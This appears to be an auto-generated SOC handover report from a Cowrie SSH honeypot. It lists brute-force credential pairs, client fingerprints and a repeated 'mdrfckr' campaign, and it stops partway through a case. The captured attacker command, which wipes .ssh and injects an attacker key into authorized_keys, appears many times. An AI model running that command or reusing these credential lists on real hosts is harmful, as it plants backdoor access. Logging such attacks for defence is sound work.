# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-09 |
| **Generated At** | 2026-04-09T22:39:35Z |
| **Shift Time** | 22:39 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **95** |
| Confirmed Threats | **93** |
| False Positives Filtered | **2** (2.1%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **10** |
| High Severity Cases | **27** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **68** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **54** |
| Unique Credential Pairs | **30** |
| Unique Usernames | **14** |
| Unique Passwords | **28** |
| Successful Auth Pairs | **23** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 27 |
| `345gs5662d34` | 12 |
| `ubuntu` | 2 |
| `odoo` | 2 |
| `test2` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 13 |
| `345gs5662d34` | 12 |
| `test` | 2 |
| `1234` | 2 |
| `Password1` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 13 |
| `345gs5662d34` | `345gs5662d34` | 12 |
| `test2` | `Password1` | 2 |
| `supervisor` | `supervisor` | 1 |
| `root` | `root11111@123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root11111@123` | `36.93.249.106` | 2026-04-09T20:48:51 |
| `root` | `3245gs5662d34` | `36.93.249.106` | 2026-04-09T20:48:54 |
| `root` | `1qazXDR%` | `36.93.249.106` | 2026-04-09T20:54:13 |
| `root` | `System1` | `36.93.249.106` | 2026-04-09T20:59:20 |
| `root` | `1A2b3c4d` | `36.93.249.106` | 2026-04-09T21:02:46 |
| `root` | `Test@1234` | `40.82.214.8` | 2026-04-09T21:24:23 |
| `root` | `3245gs5662d34` | `40.82.214.8` | 2026-04-09T21:24:27 |
| `root` | `root111!!` | `101.126.91.34` | 2026-04-09T21:26:05 |
| `root` | `3245gs5662d34` | `101.126.91.34` | 2026-04-09T21:26:10 |
| `root` | `Admin1.` | `37.143.61.84` | 2026-04-09T21:27:20 |
| `root` | `3245gs5662d34` | `37.143.61.84` | 2026-04-09T21:27:26 |
| `root` | `Qwer123!` | `120.48.181.192` | 2026-04-09T21:44:09 |
| `root` | `3245gs5662d34` | `120.48.181.192` | 2026-04-09T21:44:23 |
| `root` | `Root01#` | `120.48.181.192` | 2026-04-09T21:52:07 |
| `root` | `zaq12wsx!@` | `187.62.87.27` | 2026-04-09T22:20:59 |
| `root` | `3245gs5662d34` | `187.62.87.27` | 2026-04-09T22:21:06 |
| `root` | `a123456k` | `119.203.251.187` | 2026-04-09T22:22:33 |
| `root` | `3245gs5662d34` | `119.203.251.187` | 2026-04-09T22:22:36 |
| `root` | `QWE123456@` | `123.48.142.249` | 2026-04-09T22:27:10 |
| `root` | `3245gs5662d34` | `123.48.142.249` | 2026-04-09T22:27:13 |
| `root` | `a12345678$` | `123.48.142.249` | 2026-04-09T22:29:03 |
| `root` | `123456Ll` | `113.249.104.20` | 2026-04-09T22:29:22 |
| `root` | `3245gs5662d34` | `113.249.104.20` | 2026-04-09T22:29:26 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **95** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 91 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 82 | 11 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 82 | 11 | Modern SSH client |
| `95420f9d932d...` | libssh | 9 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `40.82.214.8`, `120.48.181.192`, `101.126.91.34`, `37.143.61.84`, `123.48.142.249`, `36.93.249.106`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **1** |
| High-Risk ASNs | **1** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 16 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (27)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6a8489b97ebb

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:48 |
| **Last Seen** | 2026-04-09 20:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:48:51` | `cowrie.session.connect` |
| `2026-04-09 20:48:51` | `cowrie.client.version` |
| `2026-04-09 20:48:51` | `cowrie.client.kex` |
| `2026-04-09 20:48:51` | `cowrie.login.success` |
| `2026-04-09 20:48:51` | `cowrie.session.params` |
| `2026-04-09 20:48:51` | `cowrie.command.input` |
| `2026-04-09 20:48:51` | `cowrie.command.failed` |
| `2026-04-09 20:48:51` | `cowrie.log.closed` |
| `2026-04-09 20:48:52` | `cowrie.session.params` |
| `2026-04-09 20:48:52` | `cowrie.command.input` |
| `2026-04-09 20:48:52` | `cowrie.session.file_download` |
| `2026-04-09 20:48:52` | `cowrie.log.closed` |
| `2026-04-09 20:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3642bc71612

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:48 |
| **Last Seen** | 2026-04-09 20:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:48:53` | `cowrie.session.connect` |
| `2026-04-09 20:48:53` | `cowrie.client.version` |
| `2026-04-09 20:48:53` | `cowrie.client.kex` |
| `2026-04-09 20:48:54` | `cowrie.login.success` |
| `2026-04-09 20:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3af817262bdf

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:54 |
| **Last Seen** | 2026-04-09 20:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:54:12` | `cowrie.session.connect` |
| `2026-04-09 20:54:12` | `cowrie.client.version` |
| `2026-04-09 20:54:12` | `cowrie.client.kex` |
| `2026-04-09 20:54:13` | `cowrie.login.success` |
| `2026-04-09 20:54:13` | `cowrie.session.params` |
| `2026-04-09 20:54:13` | `cowrie.command.input` |
| `2026-04-09 20:54:13` | `cowrie.command.failed` |
| `2026-04-09 20:54:13` | `cowrie.log.closed` |
| `2026-04-09 20:54:13` | `cowrie.session.params` |
| `2026-04-09 20:54:13` | `cowrie.command.input` |
| `2026-04-09 20:54:13` | `cowrie.session.file_download` |
| `2026-04-09 20:54:13` | `cowrie.log.closed` |
| `2026-04-09 20:54:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12b52921ce17

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:54 |
| **Last Seen** | 2026-04-09 20:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:54:15` | `cowrie.session.connect` |
| `2026-04-09 20:54:15` | `cowrie.client.version` |
| `2026-04-09 20:54:15` | `cowrie.client.kex` |
| `2026-04-09 20:54:16` | `cowrie.login.success` |
| `2026-04-09 20:54:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1184eddbf2aa

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:59 |
| **Last Seen** | 2026-04-09 20:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:59:20` | `cowrie.session.connect` |
| `2026-04-09 20:59:20` | `cowrie.client.version` |
| `2026-04-09 20:59:20` | `cowrie.client.kex` |
| `2026-04-09 20:59:20` | `cowrie.login.success` |
| `2026-04-09 20:59:20` | `cowrie.session.params` |
| `2026-04-09 20:59:20` | `cowrie.command.input` |
| `2026-04-09 20:59:20` | `cowrie.command.failed` |
| `2026-04-09 20:59:20` | `cowrie.log.closed` |
| `2026-04-09 20:59:21` | `cowrie.session.params` |
| `2026-04-09 20:59:21` | `cowrie.command.input` |
| `2026-04-09 20:59:21` | `cowrie.session.file_download` |
| `2026-04-09 20:59:21` | `cowrie.log.closed` |
| `2026-04-09 20:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-107a8ca4f8fa

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:59 |
| **Last Seen** | 2026-04-09 20:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:59:22` | `cowrie.session.connect` |
| `2026-04-09 20:59:22` | `cowrie.client.version` |
| `2026-04-09 20:59:22` | `cowrie.client.kex` |
| `2026-04-09 20:59:23` | `cowrie.login.success` |
| `2026-04-09 20:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da1947ae0545

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 21:02 |
| **Last Seen** | 2026-04-09 21:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 21:02:45` | `cowrie.session.connect` |
| `2026-04-09 21:02:45` | `cowrie.client.version` |
| `2026-04-09 21:02:46` | `cowrie.client.kex` |
| `2026-04-09 21:02:46` | `cowrie.login.success` |
| `2026-04-09 21:02:46` | `cowrie.session.params` |
| `2026-04-09 21:02:46` | `cowrie.command.input` |
| `2026-04-09 21:02:46` | `cowrie.command.failed` |
| `2026-04-09 21:02:46` | `cowrie.log.closed` |
| `2026-04-09 21:02:46` | `cowrie.session.params` |
| `2026-04-09 21:02:46` | `cowrie.command.input` |
| `2026-04-09 21:02:46` | `cowrie.session.file_download` |
| `2026-04-09 21:02:46` | `cowrie.log.closed` |
| `2026-04-09 21:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89ac4dc970ab

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 21:02 |
| **Last Seen** | 2026-04-09 21:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 21:02:48` | `cowrie.session.connect` |
| `2026-04-09 21:02:48` | `cowrie.client.version` |
| `2026-04-09 21:02:48` | `cowrie.client.kex` |
| `2026-04-09 21:02:49` | `cowrie.login.success` |
| `2026-04-09 21:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba7ea197f14b

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-04-09 21:24 |
| **Last Seen** | 2026-04-09 21:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 21:24:22` | `cowrie.session.connect` |
| `2026-04-09 21:24:22` | `cowrie.client.version` |
| `2026-04-09 21:24:22` | `cowrie.client.kex` |
| `2026-04-09 21:24:23` | `cowrie.login.success` |
| `2026-04-09 21:24:23` | `cowrie.session.params` |
| `2026-04-09 21:24:23` | `cowrie.command.input` |
| `2026-04-09 21:24:23` | `cowrie.command.failed` |
| `2026-04-09 21:24:24` | `cowrie.log.closed` |
| `2026-04-09 21:24:24` | `cowrie.session.params` |
| `2026-04-09 21:24:24` | `cowrie.command.input` |
| `2026-04-09 21:24:24` | `cowrie.session.file_download` |
| `2026-04-09 21:24:24` | `cowrie.log.closed` |
| `2026-04-09 21:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-348a3a7abda0

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-04-09 21:24 |
| **Last Seen** | 2026-04-09 21:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 21:24:26` | `cowrie.session.connect` |
| `2026-04-09 21:24:26` | `cowrie.client.version` |
| `2026-04-09 21:24:26` | `cowrie.client.kex` |
| `2026-04-09 21:24:27` | `cowrie.login.success` |
| `2026-04-09 21:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cf89979e53b

| Field | Detail |
|---|---|
| **Source IP** | `101.126.91[.]34` |
| **First Seen** | 2026-04-09 21:26 |
| **Last Seen** | 2026-04-09 21:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 21:26:04` | `cowrie.session.connect` |
| `2026-04-09 21:26:04` | `cowrie.client.version` |
| `2026-04-09 21:26:04` | `cowrie.client.kex` |
| `2026-04-09 21:26:05` | `cowrie.login.success` |
| `2026-04-09 21:26:06` | `cowrie.session.params` |
| `2026-04-09 21:26:06` | `cowrie.command.input` |
| `2026-04-09 21:26:06` | `cowrie.command.failed` |
| `2026-04-09 21:26:06` | `cowrie.log.closed` |
| `2026-04-09 21:26:06` | `cowrie.session.params` |
| `2026-04-09 21:26:06` | `cowrie.command.input` |
| `2026-04-09 21:26:06` | `cowrie.session.file_download` |
| `2026-04-09 21:26:06` | `cowrie.log.closed` |
| `2026-04-09 21:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.91[.]34` to AbuseIPDB if not already reported
- [ ] Block `101.126.91[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-776cf09421cc

| Field | Detail |
|---|---|
| **Source IP** | `101.126.91[.]34` |
| **First Seen** | 2026-04-09 21:26 |
| **Last Seen** | 2026-04-09 21:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 21:26:09` | `cowrie.session.connect` |
| `2026-04-09 21:26:09` | `cowrie.client.version` |
| `2026-04-09 21:26:09` | `cowrie.client.kex` |
| `2026-04-09 21:26:10` | `cowrie.login.success` |
| `2026-04-09 21:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.91[.]34` to AbuseIPDB if not already reported
- [ ] Block `101.126.91[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3ee4b4f0796

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]84` |
| **First Seen** | 2026-04-09 21:27 |
| **Last Seen** | 2026-04-09 21:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 21:27:19` | `cowrie.session.connect` |
| `2026-04-09 21:27:19` | `cowrie.client.version` |
| `2026-04-09 21:27:19` | `cowrie.client.kex` |
| `2026-04-09 21:27:20` | `cowrie.login.success` |
| `2026-04-09 21:27:21` | `cowrie.session.params` |
| `2026-04-09 21:27:21` | `cowrie.command.input` |
| `2026-04-09 21:27:21` | `cowrie.command.failed` |
| `2026-04-09 21:27:21` | `cowrie.log.closed` |
| `2026-04-09 21:27:21` | `cowrie.session.params` |
| `2026-04-09 21:27:21` | `cowrie.command.input` |
| `2026-04-09 21:27:22` | `cowrie.session.file_download` |
| `2026-04-09 21:27:22` | `cowrie.log.closed` |
| `2026-04-09 21:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]84` to AbuseIPDB if not already reported
